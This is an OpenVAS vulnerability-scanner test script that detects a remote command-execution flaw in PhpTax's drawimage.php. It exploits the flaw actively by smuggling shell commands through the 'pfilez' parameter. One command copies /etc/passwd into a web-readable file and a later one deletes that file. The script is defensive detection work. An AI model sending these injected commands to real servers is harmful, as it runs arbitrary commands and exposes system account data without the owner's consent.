###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phptax_55759.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# PhpTax 'drawimage.php' Remote Arbitrary Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103582");
  script_bugtraq_id(55759);
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:C");
  script_version("$Revision: 13994 $");
  script_name("PhpTax 'drawimage.php' Remote Arbitrary Command Execution Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55759");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-10-09 14:42:33 +0200 (Tue, 09 Oct 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"PhpTax is prone to a remote arbitrary command-execution vulnerability
  because it fails to properly validate user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary commands
  within the context of the vulnerable application.");

  script_tag(name:"affected", value:"PhpTax 0.8 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/phptax", "/tax", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  buf = http_get_cache( item:dir + "/index.php", port:port );

  if( "<title>PHPTAX" >< buf ) {

    vtstrings = get_vt_strings();
    file = vtstrings["lowercase_rand"] + '.txt';
    ex = 'xx%3bcat+%2Fetc%2Fpasswd+%3E+.%2F' + file  + '%3b';
    url = dir + '/drawimage.php?pdf=make&pfilez=' + ex;

    if( http_vuln_check( port:port, url:url, pattern:"image/png", check_header:TRUE ) ) {
      url = dir + '/' + file;
      if( http_vuln_check( port:port, url:url,pattern:"root:.*:0:[01]:", check_header:TRUE ) ) {
        url = dir + '/drawimage.php?pdf=make&pfilez=%3Brm+.%2F' + file  + '%3B';
        http_vuln_check( port:port, url:url, pattern:"none" );
        security_message( port:port );
        exit( 0 );
      }
    }
  }
}

exit( 99 );